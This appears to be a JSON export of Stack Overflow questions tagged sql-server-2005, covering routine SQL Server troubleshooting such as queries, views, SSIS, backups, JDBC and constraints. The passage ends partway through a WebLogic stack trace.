{"count":14377,"tag":"sql-server-2005","questions":[{"tags":["c#","jquery","asp.net",".net","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":116,"score":0,"question_id":10489740,"title":"Good way to determine if someone left a webpage","body":"<p>I am trying to code an app for work where our clients can edit certain fields. When they click edit, the code will lock the data to be editted. And when they click save the data will unlock. But I am having trouble deciding if I can unlock the data when they click elsewhere, go to another page or site, or even close the browser.</p>\n\n<p>What's a good way to decide if the user has left the edit page?</p>\n\n<p>(We are using C# .NET 3.5 and JQuery and a SQL Server 2005 DB).</p>\n"},{"tags":["sql-server","sql-server-2005","view","sql-management-studio","rownumber"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":13280520,"title":"ROW_NUMBER() in a View in SQL Server 2005","body":"<p>I have tried the following query in Microsoft SQL Server Management Studio!</p>\n\n<pre><code>select ROW_NUMBER() OVER(ORDER BY ret_id, dep_id DESC) AS 'Row Number' from Round_Trip_View\n</code></pre>\n\n<p>and it works!</p>\n\n<p>I have tried the same to create a view, and it crashed! \nAny idea?</p>\n\n<p>I am looking to assign a kind of id for each row in my view and I appreciate any alternative ideas! :)</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13279388,"title":"Subquery, Nested Select, Join, something else? - not sure","body":"<p>When I try limiting my results, I limit them too much.</p>\n\n<pre><code>Select Distinct Agreements.AgrmntID, Agreements.Status, JobSites.SiteName,\n  AgreementCharges.TotalSaleAmt, AgreementCharges.PartID,\n  AgreementSchedules.FormanEmpID, LaborCodeTypes.RepairCode\nFrom Agreements Inner Join\n  AgreementCharges On Agreements.AgrmntID = AgreementCharges.AgrmntID Inner Join\n  JobSites On JobSites.CustSiteID = Agreements.CustSiteID Left Outer Join\n  AgreementSchedules On Agreements.AgrmntID = AgreementSchedules.AgrmntID\n  Left Outer Join\n  LaborCodeTypes On LaborCodeTypes.RepairID = AgreementSchedules.RepairID\nWhere Agreements.Status = 2 And AgreementCharges.PartID = 31 And\n  LaborCodeTypes.RepairCode = '04 - LS'\n</code></pre>\n\n<p>If there is no RepairCode matching '04 - LS' I still need the AgrmntID and TotalSaleAmt.  Likewise, if there is no AgreementSchedule at all, I need AgrmntID and TotalSaleAmt.</p>\n\n<p>Output:</p>\n\n<pre><code>AgrmntID  Status  SiteName  TotalSaleAmt  PartID  FormanEmpID  RepairCode\n-------------------------------------------------------------------------\n2         2       TEST01    $100.00       31      66           04 - LS\n2         2       TEST03    $300.00       31      21           04 - LS\n</code></pre>\n\n<p>Expected Output:</p>\n\n<pre><code>AgrmntID  Status  SiteName  TotalSaleAmt  PartID  FormanEmpID  RepairCode\n-------------------------------------------------------------------------\n2         2       TEST01    $100.00       31      66           04 - LS\n2         2       TEST02    $200.00       31\n2         2       TEST03    $300.00       31      21           04 - LS\n</code></pre>\n\n<p>I've looked and looked and am now coming here for help.  Thank you in advance!!</p>\n"},{"tags":["sql","sql-server-2005","query-optimization"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":540,"score":0,"question_id":2355231,"title":"Problem using ROW_NUMBER() to get records randomly (SQL Server 2005)","body":"<p>I want to get 1000 records from a table randomly, so I use:</p>\n\n<pre><code>SELECT top 1000 \n       mycol1\n     , mycol2\n     , ROW_NUMBER() OVER (ORDER BY NEWID()) rn\nFROM mytable\n</code></pre>\n\n<p>However, I don't want to see <code>rn</code> in my resultset, so I do:</p>\n\n<pre><code>SELECT mycol1\n     , mycol2\nFROM (\n    SELECT top 1000 \n           mycol1\n         , mycol2\n         , ROW_NUMBER() OVER (ORDER BY NEWID()) rn\n    FROM mytable\n) a\n</code></pre>\n\n<p>When I do this, the results do not come randomly anymore. They come as if I just said top 10000 <strong>without</strong> randomization using row_number().</p>\n\n<p>When I change the query to </p>\n\n<pre><code>SELECT mycol1\n     , mycol2\n     , rn\nFROM (\n    SELECT top 1000 \n           mycol1\n         , mycol2\n         , ROW_NUMBER() OVER (ORDER BY NEWID()) rn\n    FROM mytable\n) a\n</code></pre>\n\n<p>they are random again.</p>\n\n<p>I guess sql server does some kind of optimization, saying \"hey, this guy doesn't need the column <code>rn</code> anyway, so just ignore it\". But this results to an unexpected behavior in this case. Is there any way to avoid this?</p>\n\n<p>PS: I use the ROW_NUMBER() trick because mytable has 10 mio. rows and </p>\n\n<pre><code>SELECT top 10000 *\nFROM mytable\nORDER BY NEWID()\n</code></pre>\n\n<p>runs forever, whereas with ROW_NUMBER() it takes only up to 30 secs.</p>\n"},{"tags":["sql-server-2005","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4900,"score":0,"question_id":733744,"title":"SQL server Error 4060","body":"<p>4060 \"Server rejected the connection; Access to selected database has been denied\".</p>\n\n<p>How can I troubleshoot this error?</p>\n"},{"tags":["sql-server-2005","vpn"],"answer_count":10,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":12994,"score":4,"question_id":669372,"title":"Not connecting to SQL Server over VPN","body":"<p>I have connected for the first time to an existing network over VPN. I can ping the IP address which is used by the SQL Server from the VPN client, but SSMS does not connect to the SQL Server. I am using the right login id and password.</p>\n\n<p>Why could this happen ? Any ideas ?</p>\n\n<p>Thanks,\nChakravarthy</p>\n"},{"tags":["sql","sql-server","database","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":21,"score":2,"question_id":13274950,"title":"list all tables that don't exist but are used in a view sql server","body":"<p>I can't seem to get all the table names that a view is trying to use.</p>\n\n<p>Currently, I am using <code>INFORMATION_SCHEMA.VIEW_COLUMN_USAGE</code> to find which tables are used. But, it only finds tables that currently exist. I want to find out if that view is trying to use tables that don't exist.</p>\n\n<p><code>View_Column_Usage</code> will only find columns that are used in the view. You can check to see if those columns are in any of the current tables columns to find which columns aren't used, but you can't find which tables aren't used.</p>\n\n<p>Does anyone know a table I can use to find which tables are used in a view, but do not exist?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13262657,"title":"Date calculation in variable","body":"<p>I'm doing my best to set a date variable so I can compare it later.  I would like something that basically says:</p>\n\n<p>If the current day-of-month is less than 11, then date is 10th of LAST month<br>\nIf the current day-of-month is greater-than-or-equal-to 11, then date is 10th of THIS month</p>\n\n<p>Date is 11/6/2012 expected output:</p>\n\n<pre><code>@PODate = 10/10/2012\n</code></pre>\n\n<p>Date is 11/16/2012 expected output:</p>\n\n<pre><code>@PODate = 11/10/2012\n</code></pre>\n\n<p>Currently all I have is this:</p>\n\n<pre><code>DECLARE @PODate as DATETIME\nSet @PODate = Convert(varchar(8),GetDate(),1)\n</code></pre>\n\n<p>Any tips or help would be greatly appreciated.  Thank you!!</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13274296,"title":"Auto Increment feature of SQL Server","body":"<p>I have created a table named as ABC. It has three columns which are as follows:-</p>\n\n<p><img src=\"http://i.stack.imgur.com/3sx3t.png\" alt=\"enter image description here\">              </p>\n\n<p>The column <code>number_pk</code> <code>(int)</code> is the <strong>primary key</strong> of my table in which I have made the <code>auto increment</code> feature on for that column.</p>\n\n<p>Now I have deleted two rows from that table say <code>Number_pk= 5</code> and <code>Number_pk =6</code>.</p>\n\n<p>The table which I get now is like this:-</p>\n\n<p><img src=\"http://i.stack.imgur.com/bTpbm.png\" alt=\"enter image description here\"></p>\n\n<p>Now if I again enter two new rows in this table with the same value I get the two new <code>Number_pk starting from 7 and 8</code> i.e,</p>\n\n<p><img src=\"http://i.stack.imgur.com/Y3fLv.png\" alt=\"enter image description here\"></p>\n\n<p>My question is that what is the logic behind this since I have deleted the two rows from the table. I know that a simple answer is because I have set the auto increment on for the primary key of my table. But I want to know is there any way that I can insert the two new entries starting from the last Number_pk without changing the design of my table?</p>\n\n<p>And how the <strong><em>SQL Server manage this record since I have deleted the rows from the database??</em></strong></p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":13213884,"title":"Why am I getting object reference not set error on script task connector?","body":"<p>I have an SSIS package (SQL Server 2005) that loops through a bunch of flat files in a folder. I need to wait until the source application has finished writing the file before I can open it in my flat file import task.</p>\n\n<p>I have a For Each loop container and within it a script task to execute before the Data Flow Task.</p>\n\n<p>When I try to create the success connector between the Script Task and the Data Flow Task I get this error: </p>\n\n<blockquote>\n  <p><em>Could not create connector. Object reference not set to an instance of\n  an object.</em></p>\n</blockquote>\n\n<p>I get that something is being set to nothing, but I can't see it. I have <code>DelayValidation</code> set to true on both the Script Task and the Data Flow Task. What else am I missing?</p>\n\n<p>I'm a C# guy so maybe I'm missing something obvious in the VB. Here's the script I poached from the interwebs:</p>\n\n<pre><code>Public Sub Main()\n    Dim strFileName As String = CType(Dts.Variables(\"FileName\").Value, String)\n    Dim objFS As System.IO.FileStream\n    Dim bolFinished As Boolean = False\n\n    Do\n        Try\n            objFS = System.IO.File.Open(strFileName, FileMode.Open, FileAccess.ReadWrite, FileShare.None)\n            bolFinished = True\n            objFS.Close()\n        Catch ex As Exception\n            System.Threading.Thread.Sleep(1000)\n        End Try\n    Loop\n\n    If bolFinished Then\n        Dts.TaskResult = Dts.Results.Success\n    Else\n        Dts.TaskResult = Dts.Results.Failure\n    End If\nEnd Sub\n</code></pre>\n"},{"tags":["c#","sql-server","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2107,"score":1,"question_id":6824188,"title":"SqlDataSourceEnumerator.Instance.GetDataSources() does not locate local SQL server 2008 instance","body":"<p>I use the following code to list all the remote and local SQL Server instances:</p>\n\n<pre><code>public static void LocateSqlInstances()\n  {\n     using( DataTable sqlSources = SqlDataSourceEnumerator.Instance.GetDataSources())\n     {\n        foreach(DataRow source in sqlSources.Rows )\n        {\n           string instanceName = source[\"InstanceName\"].ToString();\n\n           if (!string.IsNullOrEmpty(instanceName))\n           {\n              Console.WriteLine(\" Server Name:{0}\", source[\"ServerName\"]);\n              Console.WriteLine(\"   Instance Name:{0}\", source[\"InstanceName\"]);\n              Console.WriteLine(\"   Version:{0}\", source[\"Version\"]);\n              Console.WriteLine();\n           }\n        }\n        Console.ReadKey();\n     }\n  }\n</code></pre>\n\n<p>running the code on my local machine. The code can find and list a SQL server express instance (version 9.0.5000) installed but failed to list the other SQL server instance (version 10.0.1600).</p>\n\n<p>I've done a lot of research on the Internet and made sure that 1-the Sql Broswer is runing and 2 - the UDP port 1434 is open.</p>\n\n<p>Anybody knows why? Thanks.</p>\n"},{"tags":["sql-server","sql-server-2005","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1316,"score":2,"question_id":5166641,"title":"SQL Server Foreign Keys across database boundaries - techniques for enforcement","body":"<p>I have two separate SQL Server 2005 databases (on the same server) </p>\n\n<ul>\n<li>security database  </li>\n<li><p>main application database</p></li>\n<li><p>The security database has a  <strong>user table</strong> with everything needed to authenticate.  - </p></li>\n<li>The application database has a <strong>person table</strong> with extended user details. There is a 1-1 mapping between the security database user table and the application database person table.</li>\n</ul>\n\n<p>I want to enforce a mapping between the user and the person table. I'm assuming that foreign keys can't be mapped across databases thus I am wondering what to do to enforce the integrity of the relationship.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":32,"score":0,"question_id":13269545,"title":"SQL View creation error","body":"<p>I am trying to copy a view from one database to another and get the error :</p>\n\n<blockquote>\n  <p>Msg 4121, Level 16, State 1, Procedure vwPAProjects_Summary_New_2 \n  Line 2<br>\n  <em>Cannot find either column \"dbo\" or the user-defined function or\n  aggregate \"dbo.GetContractName\", or the name is ambiguous</em></p>\n</blockquote>\n\n<p>The view I am copying over is:</p>\n\n<pre><code>USE [GRAUD]\nGO\n/****** Object:  View [dbo].[vwPAProjects_Summary_New_2]    Script Date: 11/07/2012 11:57:30 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nCREATE VIEW [dbo].[vwPAProjects_Summary_New_2] AS \nselect\n dbo.GetContractName(PAPROJNUMBER) 'CONTRACT',\nPACONTNUMBER,\nisnull(dbo.GetEmployeeName(PABusMgrID),dbo.GetContractPartner(PACONTNUMBER)) 'Project Manager ID',\ncase PASTAT\nwhen 1 then 'Open'\nelse 'Closed'\nend 'Status',\ncase PAProjectType\nwhen 3 then 'Fixed Price'\nelse 'Time and Materials'\nend 'Project Type',\nPAProject_Fee_Amount 'Project Fee Amount',\nPAFTotalCost 'Forecast Total Cost',\n(PAProject_Fee_Amount - PAFTotalCost) 'Forcast Profit',\ncase\n    when PAProject_Fee_Amount = 0 then '0.00%'\n    else cast(cast(((PAProject_Fee_Amount - PAFTotalCost)/PAProject_Fee_Amount)*100 as decimal(19,2)) as varchar(21)) + '%'\nend 'Forcast %',\nPAPostedBillingsN 'Actual Billings',\nPAPostedTotalCostN 'Actual Total Cost',\n(PAPostedBillingsN - PAPostedTotalCostN) 'Current Actual Profit',\ncase\n    when PAPostedBillingsN = 0 then '0.00%'\n    else cast(cast(((PAPostedBillingsN - PAPostedTotalCostN)/PAPostedBillingsN)*100 as decimal(19,2)) as varchar(21)) + '%'\nend 'Current %'\n\nfrom PA01201\nwhere PASTAT = 1\n</code></pre>\n\n<p>Can anybody advise on how I can get this to copy over?  It has worked on other databases after I have copied it over but I cannot see any differences that would stop it this time?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13269787,"title":"SQL Server backup failing. Error: 3041, Severity: 16, State: 1","body":"<p>First of all, I'm very new at stackoverflow, so please bear with me.</p>\n\n<p>I'm running a SQL Server 9.0.4060.</p>\n\n<p>My problem is: my SQL Server backup keeps failing on a lot of the databases.</p>\n\n<p>The Maintenance plan runs to different backup jobs:</p>\n\n<p>DIFF backup everyday at 20:30 and FULL backup every Sunday at 20:30.</p>\n\n<p>I get these two errors foreach database that fails to complete the backup:</p>\n\n<pre><code>Date        06-11-2012 20:31:06\nLog     SQL Server (Current - 07-11-2012 11:43:00)\nSource      Backup\nMessage\nBACKUP failed to complete the command BACKUP DATABASE (dbname) WITH DIFFERENTIAL. Check the backup application log for detailed messages.\n\nDate        06-11-2012 20:31:06\nLog     SQL Server (Current - 07-11-2012 11:43:00)\nSource      Backup\nMessage\nError: 3041, Severity: 16, State: 1.\n</code></pre>\n\n<p>If you guys need any other information, just say the word.</p>\n"},{"tags":["asp.net","sql","sql-server","sql-server-2005","sql-server-2008"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":478,"score":0,"question_id":6120957,"title":"SQL Query Problem in Inline Query in Asp.net","body":"<p>My sql table structure is this</p>\n\n<pre><code>ID  DataName\n1   Lipsum lorem \n3   lipsum's lorem\n</code></pre>\n\n<p>My inline query in asp.net is that</p>\n\n<pre><code>select * from table where DataName like 'lipsum's lorem'\n</code></pre>\n\n<p>It gives the following errors:</p>\n\n<pre><code>Msg 102, Level 15, State 1, Line 1\nIncorrect syntax near 's'.\nMsg 105, Level 15, State 1, Line 1\nUnclosed quotation mark after the character string ''.\n</code></pre>\n\n<p>I don't want to create a stored procedure to prevent this, I want a solution to this using inline queries.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":3086,"score":4,"question_id":528529,"title":"Self-referencing constraint in MS SQL","body":"<p>Is it true that MS SQL restrict self-referencing constraints with ON DELETE CASCADE option? \nI have a table with parent-child relation, PARENT_ID column is foreign key for ID. Creating it with ON DELETE CASCADE option causes error </p>\n\n<blockquote>\n  <p>\"Introducing FOREIGN KEY constraint\n  may cause cycles or multiple cascade\n  paths. Specify ON DELETE NO ACTION or\n  ON UPDATE NO ACTION, or modify other\n  FOREIGN KEY constraints.\"</p>\n</blockquote>\n\n<p>I can't believe that I have to delete this hierarchy in recursive mode. Is there any issue except triggers?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":188,"score":0,"question_id":8731229,"title":"SQL Server string getting truncated","body":"<p>I have a column (<code>col1</code>) with <code>nvarchar(max)</code>.</p>\n\n<p>I am trying to do </p>\n\n<pre><code>DECLARE @my_string NVARCHAR(max)\nset @my_string = N'test'\n\nUPDATE dbo.tab1 \nSET col1 = @my_string + ISNULL(col1, N'')\n</code></pre>\n\n<p>no  luck , I have no idea why it is happening. @marc_s</p>\n\n<p>The string value in <code>col1</code> getting truncated after 250 characters. This happening in both SQL Server 2005 and 2008.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13266334,"title":"Substring method's in SQL query","body":"<p>This is the query which i am using to reduce the length of the character.</p>\n\n<p>these are some example char(\"For more information about the valid SQL Server 2005 data types that can be ... Is an integer that specifies where the substring starts. start can be of type bigint.\")</p>\n\n<p>if i give substring to fix the length up to 15 . the rest of the char should show like this way(...)</p>\n\n<p>my sql query is this.....</p>\n\n<pre><code>select substring('For more information about the valid SQL Server 2005 data types that can be ... Is an integer that specifies where the substring starts. start can be of type bigint.',0,15) from Admin\n</code></pre>\n\n<p>for example: it should show like this</p>\n\n<pre><code>For more information about the valid SQL Server 2005 data.\n</code></pre>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13263499,"title":"How to create Temporary table with Dynamic query in SQL Server 2005","body":"<p>I want to create Temporary table dynamically in SQL Server 2005 like below.</p>\n\n<pre><code>Create Table ##EmpMonthlyTimeReport\n(\n    EmpID UNIQUEIDENTIFIER,\n    EmpName VARCHAR(100),\n    TaskId UNIQUEIDENTIFIER,\n    [07 Nov] NVARCHAR(10),\n    [08 Nov] NVARCHAR(10),\n    [09 Nov] NVARCHAR(10)\n)\n</code></pre>\n\n<p>In the above <strong>##EmpMonthlyTimeReport</strong> table, columns [07 Nov], [08 Nov], [09 Nov] are <strong>NOT</strong> static. They are creating dynamically through another function.</p>\n\n<p>Hence, I am dynamically constructing the above table in one variable called <strong>@EmpMonthlyTimeReport</strong> and I'm executing the constructed sql string like below:</p>\n\n<pre><code>EXEC(@EmpMonthlyTimeReport)\n</code></pre>\n\n<p>I am getting the following error:</p>\n\n<pre><code>Msg 50000, Level 16, State 1, Procedure SVS_WorkOnWeekends, Line 157\nThe name 'INSERT INTO ##EmpMonthlyTimeReport(EmpID, EmpName, TaskId)\nSELECT EmpId, EmpName, TaskId FROM TableData \nSELECT * FROM ##EmpMonthlyTimeReport\nDROP TABLE ##EmpMonthlyTimeReport' is not a valid identifier.\n</code></pre>\n"},{"tags":["sql-server-2005","jdbc","cursor"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3804,"score":1,"question_id":535032,"title":"How do you make sql server jdbc calls to stored procedure use a server side cursor?","body":"<p>I am using JDBC to call a stored procedure in MSSql 2005.  I would like to have the result set make use of server side cursors to limit the amount of memory used by the client.  I am able to do this easily using a simple query and setting the SelectMethod=cursor on the connection.  When I put that query in a stored procedure, it appears that the entire result set is being returned as if the connection were created with SelectMethod=direct.  </p>\n\n<p>Is there a way to make the stored procedure call behave like a simple query.</p>\n\n<p>I have tested with MS SQL JDBC driver 1.1 and 1.2.  In the sample below, the difference between the two values of totalMemory is dependent on the size of the results without fetching any of the rows.</p>\n\n<pre><code>long totalMemoryUsed = java.lang.Runtime.getRuntime().totalMemory();\nString sql = \"{call ap_Select(?, ?, ?, ?)}\";\n\nCallableStatement cstmt = conn.prepareCall(sql,ResultSet.TYPE_FORWARD_ONLY,  \n                           ResultSet.CONCUR_READ_ONLY); \t\ncstmt.setString(1,readAlldbnames );\ncstmt.setString(2,readPublicDbnames);\ncstmt.setString(3, whereClause);\ncstmt.setString(4, \" order by key5 \");\n\nResultSet a_resultSet = cstmt.executeQuery();\nlong totalMemoryUsedAfterQuery = java.lang.Runtime.getRuntime().totalMemory();\n</code></pre>\n"},{"tags":["sql-server-2005","replication","articles"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":828,"score":0,"question_id":2008897,"title":"SQL Server: How to Determine all tables associated with replication, and which articles","body":"<p>How would I iterate through the tables of a database, and determine which publication and article those tables are associated with?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13252165,"title":"concatenate with 3 or 4 joins","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13177874/combine-multiple-rows-int-one-row-with-many-to-many\">combine multiple rows int one row with many to many</a>  </p>\n</blockquote>\n\n\n\n<p>Using SQL Server I have the following tables/ data</p>\n\n<pre><code>CUS_VISIT\n\nCus_ID    Cus_Vis_ID\n1           01\n1           02\n2           01\n</code></pre>\n\n<p>and</p>\n\n<pre><code>CUS_EVENT\n\nCus_Event_ID    Cus_ID    Cus_Vis_ID\n001               1            01\n002               1            01\n</code></pre>\n\n<p>and</p>\n\n<pre><code>CUS_XREF\n\nCus_ID    Cus_Event_ID    Cus_Prt_ID    Cus_Seq_No\n1            001               1           1\n1            001               2           1\n</code></pre>\n\n<p>and</p>\n\n<pre><code>CUS_PRT\n\nCus_ID    Cus_Prt_ID    Prt_Cd\n1            1            1A\n1            2            2A\n</code></pre>\n\n<p>I am trying to get the following</p>\n\n<p>SQL RESULTS</p>\n\n<pre><code>Cus_ID     Prt_Cd     Cus_Vis_ID\n1           1A,2A        1\n</code></pre>\n\n<p>what I end up with is</p>\n\n<p>SQL RESULTS</p>\n\n<pre><code>Cus_ID     Prt_Cd     Cus_Vis_ID\n1           1A           1\n1           2A           1\n</code></pre>\n\n<p>The tables are linked by ...</p>\n\n<pre><code>CUS_VISIT.Cus_ID    = CUS_EVENT.Cus_ID \nCUS_VISIT.Cus_Vis_ID  = CUS_EVENT.Cus_Vis_ID\nCUS_VISIT.Cus_ID = CUS_XREF.Cus_ID\nCUS_EVENT.Cus_Event_ID = CUS_XREF.Cus_Event_ID    \nCUS_XREF.Cus_Prt_ID = CUS_PRT.Cus_Prt_ID \nCUS_XREF.Cus_ID = CUS_PRT.Cus_ID \n</code></pre>\n\n<p>I can almost get what I am after if I drop the CUS_XREF.Cus_Prt_ID = CUS_PRT.Cus_Prt_ID join but then I get all of the part codes (Prt_Cd) for the customer not just the ones for that visit. </p>\n\n<p>here is what i have</p>\n\n<pre><code>select distinct CUS_EVENT.cus_id, CUS_EVENT.cus_visit_id,\n    (Select CUS_PRT.prt_cd + ',' AS [text()]\n    From CUS_PRT, CUS_XREF\n    where \n    CUS_EVENT.cus_id=XREF.cus_id\n    and CUS_EVENT.cus_event_id = XREF.cus_event_id \n    and CUS_XREF.cus_id=CUS_PRT.cus_id \n    and CUS_XREF.cus_prt_id = CUS_PRT.cus_prt_id \n    and CUS_XREF.prt_seq_no ='1'\n    order by CUS_PRT.prt_cd\n    for XML PATH('')) [Codes]\nfrom CUS_EVENT\n</code></pre>\n\n<p>i made a similar post recently but didn't get any specific help. i think i need another sub-query some where. thanks for looking at this.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":7,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":5382,"score":9,"question_id":2384786,"title":"Delete SQL Server 2005 records without logging","body":"<p>How to delete records from SQL Server 2005 tables without logging them into transaction logs. </p>\n\n<p>I do not wish to log because once deleted, those records will never be needed again. </p>\n\n<p>Currently the various deletes take too much of time. Are there any other options to improve performance of delete statements? I can not use truncate since there is a where clause needed.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13258297,"title":"A script to test existence of primary keys","body":"<p>Trying to figure out a SQL script to test the existence of primary keys in cerain tables.  If the table has no primary key, then the script should output the table name.</p>\n\n<pre><code>Tables to test:\nTableA\nTableB\nTableC\n</code></pre>\n\n<p>After running the script (and lets say TableA and TableC have PKs, but not TableB), then the output would be below:</p>\n\n<pre><code>NoKeys\nTableB\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13254583,"title":"Removing LOB column from table. Lob used page count not equals to 0","body":"<p>I altered a table that was used to contains a Lob column (VarBinary(MAX)).</p>\n\n<p>When I run </p>\n\n<pre><code>select * from sys.dm_db_partition_stats\nwhere [object_id] = object_id('MyTable')\n</code></pre>\n\n<p>the lob_used_page_count is 1014969. I thought it would be 0. Am I wrong or is there something I need to do?</p>\n"},{"tags":["sql","sql-server","query","sql-server-2005"],"answer_count":9,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":71,"score":-1,"question_id":13253445,"title":"Select Part of Column","body":"<p>I was wondering if anyone could help with a query to select part of a column.</p>\n\n<p>The column 'criteriadata' contains data that would look like this:</p>\n\n<blockquote>\n  <p><strong>CriteriaData</strong></p>\n  \n  <p>14 27 15 C</p>\n  \n  <p>14 30 15 DD</p>\n  \n  <p>14 38 15 Pass</p>\n  \n  <p>14 33 15 Pass</p>\n</blockquote>\n\n<p>How can I select just the data that appears after the number 15.</p>\n\n<p>Many thanks.</p>\n"},{"tags":["java","sql-server-2005","java-ee","weblogic","weblogic-10.x"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":692,"score":0,"question_id":9409496,"title":"weblogic stuck issue","body":"<p>We have encountered an issue as below\nwe don't know if the problem are:\n1.socket reading from database is too long that reach the StuckThreadMaxTime 600s\n2.database query is running too long\n2.locking on database or other objects</p>\n\n<p>any suggestions will be greatly appreciated!</p>\n\n<blockquote>\n  <p>Thread-36 \"[STUCK] ExecuteThread: '3' for queue:\n  'weblogic.kernel.Default (self-tuning)'\"  {\n      jrockit.net.SocketNativeIO.readBytesPinned(SocketNativeIO.java:???)\n      jrockit.net.SocketNativeIO.socketRead(SocketNativeIO.java:31)\n      java.net.SocketInputStream.socketRead0(SocketInputStream.java:???)\n      java.net.SocketInputStream.read(SocketInputStream.java:107)\n      com.microsoft.sqlserver.jdbc.DBComms.receive(Unknown Source)\n      com.microsoft.sqlserver.jdbc.SQLServerStatement.doExecuteStatement(Unknown\n  Source)\n      com.microsoft.sqlserver.jdbc.SQLServerStatement$StatementExecutionRequest.executeStatement(Unknown\n  Source)\n      com.microsoft.sqlserver.jdbc.CancelableRequest.execute(Unknown Source)\n      com.microsoft.sqlserver.jdbc.SQLServerConnection.executeRequest(Unknown\n  Source)</p>\n  \n  <p>^-- Holding lock: com.microsoft.sqlserver.jdbc.TDSWriter@41dbbdd[thin lock]\n      com.microsoft.sqlserver.jdbc.SQLServerStatement.executeQuery(Unknown\n  Source)\n      com.microsoft.sqlserver.jdbc.SQLServerStatement.getMaxFieldSize(Unknown\n  Source)\n      weblogic.jdbc.common.internal.ConnectionEnv.cleanUpStatementForReUse(ConnectionEnv.java:1356)\n      weblogic.jdbc.common.internal.ConnectionEnv.returnCachedStatement(ConnectionEnv.java:1118)\n      ^-- Holding lock: weblogic.jdbc.common.internal.ConnectionEnv$1@41f2d97[thin lock]\n      weblogic.jdbc.wrapper.Statement.internalClose(Statement.java:342)\n      weblogic.jdbc.wrapper.Statement.doClose(Statement.java:399)\n      weblogic.jdbc.wrapper.Statement.close(Statement.java:391)\n      com.riskintegrator.infrastructure.database.DBConnector.getConnection(DBConnector.java:66)\n      ^-- Holding lock: com.riskintegrator.infrastructure.database.DBConnector@1fda7d8[thin\n  lock]\n      com.riskintegrator.infrastructure.database.DBConnector.(DBConnector.java:56)\n      com.riskintegrator.slsb.BaseSessionBean.populateFormWithPreparedStatement(BaseSessionBean.java:76)\n      com.riskintegrator.slsb.BaseSession_6uq9n4_EOImpl.populateFormWithPreparedStatement(BaseSession_6uq9n4_EOImpl.java:763)\n      com.riskintegrator.slsb.BaseSessionDelegate.populateFormWithPreparedStatement(BaseSessionDelegate.java:118)\n      com.riskintegrator.slsb.setup.SeverityBandBD.selectByValue(SeverityBandBD.java:181)\n      com.riskintegrator.slsb.ca.ComputeAssessmentScoreBean.ComputeRiskScore(ComputeAssessmentScoreBean.java:332)\n      com.riskintegrator.slsb.ca.ComputeAssessmentScoreBean.ComputeAssessmentScore(ComputeAssessmentScoreBean.java:119)\n      com.riskintegrator.slsb.ca.ComputeAssessmentScoreBean_s478gq_EOImpl.ComputeAssessmentScore(ComputeAssessmentScoreBean_s478gq_EOImpl.java:37)\n      com.riskintegrator.slsb.ca.ComputeAssessmentScoreBD.ComputeAssessmentScore(ComputeAssessmentScoreBD.java:32)\n      com.riskintegrator.slsb.ca.AssessmentScoreBean.ProcessAssessment(AssessmentScoreBean.java:44)\n      com.riskintegrator.slsb.ca.AssessmentScoreSession_nlmr0a_EOImpl.ProcessAssessment(AssessmentScoreSession_nlmr0a_EOImpl.java:37)\n      com.riskintegrator.slsb.ca.AssessmentScoreBD.ProcessAssessment(AssessmentScoreBD.java:36)\n      